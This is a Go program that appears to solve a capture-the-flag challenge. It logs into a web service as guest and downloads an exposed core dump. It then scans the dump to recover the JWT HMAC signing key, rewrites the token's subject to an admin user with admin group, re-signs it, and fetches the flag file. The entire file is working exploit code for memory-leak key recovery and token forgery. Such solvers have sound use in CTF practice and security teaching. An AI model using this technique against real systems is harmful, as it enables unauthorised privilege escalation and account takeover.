package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path"
	"strings"

	"github.com/golang-jwt/jwt/v5"
	"golang.org/x/net/publicsuffix"
)

// Info about a user
type UserInfo struct {
	Username string   `json:"username"`
	Groups   []string `json:"groups"`
}

func MakeKeyVerifier(tokenString string) func([]byte) bool {
	p := jwt.NewParser()
	tok, parts, err := p.ParseUnverified(tokenString, jwt.MapClaims{})
	if err != nil {
		panic(err)
	}
	tok.Signature, err = p.DecodeSegment(parts[2])
	text := strings.Join(parts[0:2], ".")
	return func(key []byte) bool {
		return tok.Method.Verify(text, tok.Signature, key) == nil
	}
}

func MustParseURL(u string) *url.URL {
	rv, err := url.Parse(u)
	if err != nil {
		panic(err)
	}
	return rv
}

func URLWithSuffix(u *url.URL, s string) *url.URL {
	tmp := *u
	tmp.Path = path.Join(u.Path, s)
	return &tmp
}

func main() {
	// Make login request
	endpoint := "127.0.0.1:5432"
	if len(os.Args) > 1 {
		endpoint = os.Args[1]
	}
	if !strings.HasPrefix(endpoint, "http") {
		endpoint = "http://" + endpoint
	}
	epurl := MustParseURL(endpoint)
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		panic(err)
	}
	client := &http.Client{
		Jar: jar,
	}

	// Get the cookie
	var buf bytes.Buffer
	vals := url.Values{}
	vals.Set("username", "guest")
	vals.Set("password", "guest")
	buf.Write([]byte(vals.Encode()))
	if buf.Len() <= 0 {
		fmt.Println("empty buffer after encoding")
		os.Exit(1)
	}
	req, err := http.NewRequest("POST", URLWithSuffix(epurl, "/api/login").String(), &buf)
	if err != nil {
		fmt.Printf("error building login request: %s\n", err)
		os.Exit(1)
	}
	req.Header.Add("Content-type", "application/x-www-form-urlencoded")
	var cookieVal string
	if resp, err := client.Do(req); err != nil {
		fmt.Printf("login request failed: %s\n", err)
		os.Exit(1)
	} else {
		if resp.StatusCode != 200 {
			fmt.Printf("non-200 StatusCode in login: %d\n", resp.StatusCode)
			os.Exit(1)
		}
		resp.Body.Close()
		cookies := jar.Cookies(epurl)
		if len(cookies) == 0 {
			fmt.Println("in login, 0 cookies!")
			os.Exit(1)
		}
		for _, c := range cookies {
			if c.Name != "cwaid" {
				continue
			}
			cookieVal = c.Value
			break
		}
	}
	if cookieVal == "" {
		fmt.Println("no cwaid cookie value")
		os.Exit(1)
	} else {
		fmt.Printf("cwaid: %s\n", cookieVal)
	}
	verifier := MakeKeyVerifier(cookieVal)

	// Now get the core file
	fmt.Println("retrieving core")
	var coreBuf bytes.Buffer
	req, err = http.NewRequest("GET", URLWithSuffix(epurl, "/f/core").String(), nil)
	if resp, err := client.Do(req); err != nil {
		fmt.Printf("core request failed: %s\n", err)
		os.Exit(1)
	} else {
		if resp.StatusCode != 200 {
			fmt.Printf("non-200 StatusCode in core: %d\n", resp.StatusCode)
			os.Exit(1)
		}
		if _, err := io.Copy(&coreBuf, resp.Body); err != nil {
			fmt.Printf("error copying core buffer: %s\n", err)
			os.Exit(1)
		}
		resp.Body.Close()
	}
	fmt.Println("finding key")

	// Search for a key in memory!
	bufSlice := coreBuf.Bytes()
	// Assume 8 byte alignment
	var keyFound []byte
	keyLen := 256 / 8
	for i := 0; i < len(bufSlice); i += 8 {
		keyPiece := bufSlice[i : i+keyLen]
		if verifier(keyPiece) {
			keyFound = keyPiece
			break
		}
	}

	if keyFound == nil || len(keyFound) == 0 {
		fmt.Println("key not found!")
		os.Exit(1)
	}
	hexKey := hex.EncodeToString(keyFound)
	fmt.Printf("found key: %s\n", hexKey)

	// Now use the key to generate a new ID
	claims := jwt.MapClaims{}
	parser := jwt.NewParser()
	tok, err := parser.ParseWithClaims(cookieVal, claims, func(_ *jwt.Token) (interface{}, error) {
		return keyFound, nil
	})
	if err != nil {
		panic(err)
	}
	var userInfo UserInfo
	if subj, err := claims.GetSubject(); err != nil {
		panic(err)
	} else {
		fmt.Printf("subject: %s\n", subj)
		if buf, err := base64.RawStdEncoding.DecodeString(subj); err != nil {
			fmt.Printf("error base64 decoding: %s\n", err)
			os.Exit(1)
		} else {
			newbuf := bytes.NewBuffer(buf)
			dec := json.NewDecoder(newbuf)
			if err := dec.Decode(&userInfo); err != nil {
				fmt.Printf("error JSON decoding: %s\n", err)
				os.Exit(1)
			}
		}
	}

	// Update subject
	userInfo.Username = "admin"
	userInfo.Groups = append(userInfo.Groups, "admin")

	var jsonBuf bytes.Buffer
	enc := json.NewEncoder(&jsonBuf)
	if err := enc.Encode(&userInfo); err != nil {
		fmt.Printf("error JSON encoding: %s\n", err)
		os.Exit(1)
	}
	newaudience := base64.RawStdEncoding.EncodeToString(jsonBuf.Bytes())
	claims["sub"] = newaudience

	// Now re-sign
	signed, err := tok.SignedString(keyFound)
	if err != nil {
		fmt.Printf("error signing token: %s\n", err)
		os.Exit(1)
	}
	fmt.Printf("new token: %s\n", signed)

	// Retrieve the flag
	jar.SetCookies(epurl, []*http.Cookie{&http.Cookie{
		Name:  "cwaid",
		Value: signed,
	}})
	req, err = http.NewRequest("GET", URLWithSuffix(epurl, "/f/flag.txt").String(), nil)
	if err != nil {
		fmt.Printf("error building flag request: %s\n", err)
		os.Exit(1)
	}
	if resp, err := client.Do(req); err != nil {
		fmt.Printf("error requesting flag.txt: %s\n", err)
		os.Exit(1)
	} else if resp.StatusCode != 200 {
		resp.Body.Close()
		fmt.Printf("non-200 %d on retrieving flag\n", resp.StatusCode)
		os.Exit(1)
	} else {
		fmt.Printf("flag: ")
		os.Stdout.Sync()
		io.Copy(os.Stdout, resp.Body)
		os.Stdout.Sync()
		fmt.Println("")
	}
}
